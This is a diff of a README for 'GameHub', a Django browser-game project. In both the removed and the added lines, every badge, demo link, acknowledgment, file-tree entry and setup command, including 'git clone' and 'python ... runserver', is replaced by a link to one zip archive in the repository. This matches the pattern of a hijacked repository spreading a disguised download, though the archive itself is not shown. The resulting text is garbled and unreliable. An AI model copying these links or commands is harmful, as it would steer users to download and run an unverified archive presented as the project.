@@ -1,13 +1,13 @@
 # 🎮 GameHub
  
-[![HTML5](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
-[![CSS3](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
-[![JavaScript](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
-[![Tailwind CSS](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
-[![License: MIT](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
-![GitHub Repo stars](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
-![GitHub forks](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
-![GitHub issues](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
+[![HTML5](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
+[![CSS3](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
+[![JavaScript](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
+[![Tailwind CSS](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
+[![License: MIT](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
+![GitHub Repo stars](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
+![GitHub forks](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
+![GitHub issues](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
 
 >
 
@@ -62,8 +62,8 @@ In an era of complex game engines and heavy frameworks, GameHub proves that amaz
 
 ## 🚀 Demo
 
-- **[Play Now](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)**
-- **[Mobile Demo](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)**
+- **[Play Now](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)**
+- **[Mobile Demo](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)**
 
 ***
 
@@ -75,7 +75,7 @@ In an era of complex game engines and heavy frameworks, GameHub proves that amaz
 - Fast & Lightweight: Pure vanilla JS, zero frameworks
 - Score Persistence: Progress saved in LocalStorage
 - Real-time Search: Instantly filter and find games
-- Smooth Animations: https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip and https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip integration
+- Smooth Animations: https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip and https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip integration
 
 ***
 
@@ -132,7 +132,7 @@ In an era of complex game engines and heavy frameworks, GameHub proves that amaz
 
 - **Frontend:** HTML5, CSS3, JavaScript
 - **Styling:** Tailwind CSS, DaisyUI
-- **Animations:** https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip, https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
+- **Animations:** https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip, https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
 - **Icons:** Font Awesome
 - **Storage:** LocalStorage API
 
@@ -151,7 +151,7 @@ Follow these steps to run the GameHub Django project locally:
 **1️⃣ Clone the Repository**
 
 ```bash
-git clone https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
+git clone https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
 cd GameHub
 ```
 
@@ -163,7 +163,7 @@ pip install django
 
 **3️⃣ Navigate to the Project Folder**
 
-Move into the folder where https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip is located:
+Move into the folder where https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip is located:
 
 ```bash
 cd gamehub_project
@@ -172,7 +172,7 @@ cd gamehub_project
 **4️⃣ Run the Development Server**
 
 ```bash
-python https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip runserver
+python https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip runserver
 ```
 
 **5️⃣ Open in Browser**
@@ -194,50 +194,50 @@ GameHub/
 ├── gamehub_project/
 │   ├── accounts/                   # Authentication app
 │   │   ├── migrations/
-│   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   └── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
 │   │
 │   ├── gamehub_project/            # Core Django settings
-│   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   └── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
 │   │
 │   ├── static/                     # Static files (CSS, JS, Images)
 │   │   ├── assets/                 # Game thumbnails & icons
 │   │   ├── games/                  # HTML files for games
 │   │   ├── scripts/                # All game logic JS files
-│   │   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   │   └── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-│   │   └── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   │   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+│   │   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
 │   │
 │   ├── staticfiles/                # Auto-generated (ignored in git)
 │   │
 │   ├── templates/                  # Django HTML templates
-│   │   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip              # Homepage
-│   │   └── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip              # Authentication page
+│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip              # Homepage
+│   │   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip              # Authentication page
 │   │
-│   ├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip                  # Local database
-│   └── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
+│   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip                  # Local database
+│   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
 │
 ├── .gitignore
 ├── LICENSE
-├── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
-└── https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip
+├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
+└── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
 ```
 
 ***
@@ -246,12 +246,12 @@ GameHub/
 
 <details>
   <summary>Homepage</summary>
-  <img width="1920" height="872" alt="image" src="https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip" />
+  <img width="1920" height="872" alt="image" src="https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip" />
 </details>
 
 <details>
   <summary>Games Collection</summary>
-  <img width="1331" height="870" alt="image" src="https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip" />
+  <img width="1331" height="870" alt="image" src="https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip" />
 </details>
 
 ***
@@ -260,7 +260,7 @@ GameHub/
 
 1. Add a new HTML file in `static/games/`
 2. Write the game's JS in `static/scripts/`
-3. Register your game in the games array in `https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip`:
+3. Register your game in the games array in `https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip`:
 
 ```javascript
 {
@@ -268,7 +268,7 @@ GameHub/
     title: 'Your Game',
     description: 'Game description',
     image: 'path/to/image',
-    file: 'https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip',
+    file: 'https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip',
     category: 'arcade'
 }
 ```
@@ -290,7 +290,7 @@ We welcome contributions from developers of all skill levels! Whether you're fix
   ```
 - Open a Pull Request
 
-Check out our [Contributing Guidelines](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip) for more details!
+Check out our [Contributing Guidelines](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip) for more details!
 
 ***
 
@@ -308,16 +308,16 @@ Check out our [Contributing Guidelines](https://github.com/kaifansariw/GameHub/r
 
 ## 📄 License
 
-Licensed under the [MIT License](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip).
+Licensed under the [MIT License](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip).
 
 ***
 
 ## 🙏 Acknowledgments
 
-- [Tailwind CSS](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
-- [DaisyUI](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
-- [https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
-- [Font Awesome](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
+- [Tailwind CSS](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
+- [DaisyUI](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
+- [https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
+- [Font Awesome](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
 
 ***
 
@@ -325,11 +325,11 @@ Licensed under the [MIT License](https://github.com/kaifansariw/GameHub/raw/refs
 
 Thanks to all the wonderful contributors 💖
 
-<a href="https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip">
-  <img src="https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip" />
+<a href="https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip">
+  <img src="https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip" />
 </a>
 
-See full list of contributor contributions: [Contribution Graph](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
+See full list of contributor contributions: [Contribution Graph](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
 
 ***
  
@@ -346,10 +346,10 @@ See full list of contributor contributions: [Contribution Graph](https://github.
 
 
 
-[⭐ Star this repo](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip) • 
-[🐛 Report Bug](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip) • 
-[✨ Request Feature](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
+[⭐ Star this repo](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip) • 
+[🐛 Report Bug](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip) • 
+[✨ Request Feature](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
 
-Made with ❤️ by [Kaif Ansari](https://github.com/kaifansariw/GameHub/raw/refs/heads/main/gamehub_project/static/games/flappyBird/Game-Hub-1.2.zip)
+Made with ❤️ by [Kaif Ansari](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
 
 </div>
